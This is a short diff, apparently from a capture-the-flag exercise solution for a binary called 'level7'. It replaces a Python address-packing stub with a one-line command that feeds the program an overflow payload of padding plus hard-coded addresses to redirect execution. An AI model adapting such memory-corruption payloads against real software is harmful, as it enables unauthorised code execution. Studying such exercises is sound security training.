@@ -1,9 +1,1 @@
-import struct
-
-oAddr = struct.pack("I", 0x8048703)
-
-nAddr = struct.pack("I", 0x8049960)
-
-padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
-
-print padding
+./level7 `python -c "print 'AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"`
